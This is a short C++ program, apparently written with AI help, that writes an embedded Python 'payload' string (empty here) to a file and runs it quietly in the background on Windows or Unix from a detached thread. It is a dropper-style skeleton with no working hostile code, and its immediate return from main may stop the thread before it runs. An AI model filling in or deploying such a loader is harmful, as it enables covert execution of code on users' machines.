// Note: following code was assisted by googel gemini



#include <iostream>
#include <fstream> // Required for file I/O
#include <cstdlib> // Required for system()
#include <string>  // Required for std::string
#include <vector>  // Required for std::vector
#include <thread>  // Required for std::thread

void runPayload() {
    const char* python_payload = "";

    const char* scriptName = "hello_from_cpp.py";

    std::ofstream outFile(scriptName);

    if (outFile.is_open()) {
        outFile << python_payload << std::endl;
        outFile.close(); // Close the file

        // List of common python commands to try
        std::vector<std::string> python_commands = {"python3", "python", "py"};
        bool script_ran = false;

        for (const auto& py_cmd : python_commands) {
            #ifdef _WIN32
                std::string check_command = py_cmd + " --version > nul 2>&1";
            #else
                std::string check_command = py_cmd + " --version > /dev/null 2>&1";
            #endif
            if (system(check_command.c_str()) == 0) {
                std::string run_command;
                #ifdef _WIN32
                    // On Windows, 'start /B' runs a command without creating a new window.
                    run_command = "start /B " + py_cmd + " " + scriptName;
                #else
                    // On Linux/macOS, '&' runs the command in the background.
                    run_command = py_cmd + " " + scriptName + " &";
                #endif
                system(run_command.c_str());
                script_ran = true;
                break; // Exit the loop once a working command is found
            }
        }

        // Note: Any logging (std::cout, std::cerr) here might not be visible
        // if the main terminal closes instantly.
    }
}

int main(){
    // Create a new thread that will run the runPayload function.
    std::thread payloadThread(runPayload);
    // Detach the thread to let it run independently in the background.
    payloadThread.detach();
    return 0;
}